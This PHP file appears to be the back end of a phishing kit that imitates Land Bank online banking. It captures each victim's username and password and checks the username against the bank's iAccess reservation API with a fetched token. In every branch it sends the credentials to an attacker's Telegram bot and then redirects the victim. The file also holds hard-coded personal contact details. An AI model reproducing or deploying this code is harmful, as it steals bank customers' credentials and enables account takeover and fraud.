<?php
error_reporting(0);
error_log(0);
include("config.php");

setcookie("username", $_POST['username'], time() + 86400, "/");
setcookie("password", $_POST['password'], time() + 86400, "/");


$username = $_POST['username'];

$ch = curl_init();
$ch2 = curl_init();
 
curl_setopt($ch2, CURLOPT_URL, 'https://ldd.landbank.com/ws/api/application/personal');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, '{"appTypeCode": "P","appSubtypeCode": "10"}');
curl_setopt($ch2, CURLOPT_ENCODING, 'gzip, deflate');
 
$headers2 = array();
$headers2[] = 'Connection: keep-alive';
$headers2[] = 'Sec-Ch-Ua: ';
$headers2[] = 'Accept: application/json, text/plain, */*';
$headers2[] = 'Content-Type: application/json';
$headers2[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers2[] = 'Sec-Ch-Ua-Platform: Windows\"\"';
$headers2[] = 'Origin: https://dobs.landbank.com';
$headers2[] = 'Sec-Fetch-Site: same-origin';
$headers2[] = 'Sec-Fetch-Mode: cors';
$headers2[] = 'Sec-Fetch-Dest: empty';
$headers2[] = 'Referer: https://dobs.landbank.com/DOBS/home/acctInit';
$headers2[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers2);
 
$result2 = curl_exec($ch2);
$obj = json_decode($result2);
$token= $obj->{'jwt'};
curl_close($ch2);

curl_setopt($ch, CURLOPT_URL, 'https://ldd.landbank.com/ws/api/iaccess/users/reserve');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"oldValues": {"versionID": null,"oldValues": {}},"refNo": "CI45818527","applicationNo": "AC44022574","hasIAccess": "N","preferredId": "'.$username.'","email": "benjamesancheta@yahoo.com","mobileNo": "09189877876","securityQuestion1": "Who is your favorite superhero?","securityAnswer1": "titemo","securityQuestion2": "What is the first name of your favorite aunt?","securityAnswer2": "titemo","securityQuestion3": "Who is your favorite author?","securityAnswer3": "titemo"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer '.$token;
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result2 = curl_exec($ch);
$obj = json_decode($result2);
 
//echo $result;
if (strpos($result2, "iAccess ID already exists")) {
$data = [
'chat_id' => $chat_id,
'text' => "Valid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
header("Location: mobile.php");
}

else if (strpos($result2, "iAccess ID must have at least 6 character(s).")) {
$data = [
'chat_id' => $chat_id,
'text' => "Invalid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
header("Location: ./?invalid");
}

else if (strpos($result2, "E-mail Address already exists")){

$data = [
'chat_id' => $chat_id,
'text' => "Invalid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

header("Location: ./?invalid");
}else if (strpos($result2, "iAccess ID does not accept")){

$data = [
'chat_id' => $chat_id,
'text' => "Invalid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

header("Location: ./?invalid");
}
else{
$data = [
'chat_id' => $chat_id,
'text' => "error in checking\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
header("Location: mobile.php");
}
?>
